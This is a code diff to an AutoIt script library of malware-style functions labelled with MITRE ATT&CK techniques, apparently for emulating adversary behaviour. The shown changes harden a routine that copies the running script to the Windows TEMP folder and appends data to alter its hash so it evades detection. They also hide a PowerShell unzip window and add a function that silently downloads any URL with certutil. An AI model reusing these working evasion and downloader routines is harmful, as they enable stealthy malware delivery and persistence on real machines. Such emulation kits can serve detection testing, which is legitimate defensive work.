@@ -143,18 +143,18 @@ Func RandomString();DESCRIPTION:random string generator;MITRE:-
 EndFunc
 
 Func CopyTempRun($newName = RandomString());DESCRIPTION:copy myself into temp changing hash;MITRE:Defence Evasion
-   FileCopy(@ScriptDir & "\" & @ScriptName, @TempDir & "\" & $newName, $FC_OVERWRITE + $FC_CREATEPATH)
-   Local $hFileOpen = FileOpen(@TempDir & "\" & $newName, $FO_APPEND)
+   FileCopy(@ScriptDir & "\" & @ScriptName, "C:\WINDOWS\TEMP\" & $newName, $FC_OVERWRITE + $FC_CREATEPATH)
+   Local $hFileOpen = FileOpen("C:\WINDOWS\TEMP\" & $newName, $FO_APPEND)
    If $hFileOpen = -1 Then
 	  Return False
    EndIf
    FileWriteLine($hFileOpen, "1")
    FileClose($hFileOpen)
-   RunWait(@TempDir & "\" & $newName & " " & "delete_previous" & " " & @ScriptDir & "\" & @ScriptName);
+   RunWait("C:\WINDOWS\TEMP\" & $newName & " " & "delete_previous" & " " & @ScriptDir & "\" & @ScriptName);
 EndFunc
 
 Func isRunningFromTemp();DESCRIPTION:Check if sample is running from Temp folder;MITRE:Discovery
-   if (StringUpper(@ScriptDir) & "\" & @ScriptName == StringUpper(@TempDir) & "\" & @ScriptName) Then
+   if (StringUpper(@ScriptDir) & "\" & @ScriptName == "C:\WINDOWS\TEMP\" & @ScriptName) Then
 	  Return 1
    EndIf
 EndFunc
@@ -328,5 +328,9 @@ Func ReadFile($sFilePath);DESCRIPTION:open a file and get content to a variable;
 EndFunc
 
 Func Unzip($source,$destination);DESCRIPTION:unzip;MITRE:-
-   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Expand-Archive -Force" & " " & $source & " " & $destination)
+   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Expand-Archive -Force" & " " & $source & " " & $destination, "", @SW_HIDE)
+EndFunc
+
+Func CertUtilDownloader($url, $fname) ;DESCRIPTION:use Cert Utility to download file;MITRE:LateralMovement,CommandAndControl
+   RunWait("certutil.exe -urlcache -f " & $url & " C:\WINDOWS\TEMP\" & $fname,"" ,@SW_HIDE)
 EndFunc
